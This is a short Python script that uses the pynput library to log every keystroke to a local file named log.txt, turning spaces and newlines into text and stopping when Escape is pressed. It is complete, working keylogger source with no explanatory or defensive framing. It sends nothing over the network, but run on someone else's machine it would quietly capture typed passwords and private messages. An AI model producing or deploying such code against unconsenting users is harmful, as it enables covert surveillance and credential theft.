from pynput import keyboard

log_file = "log.txt"

def write_file(key):
    key = str(key).replace("'", "")

    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif key == "Key.esc":
        return False
    elif "Key" in key:
        key = ""

    with open(log_file, "a") as f:
        f.write(key)

def on_press(key):
    if write_file(key) == False:
        return False

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()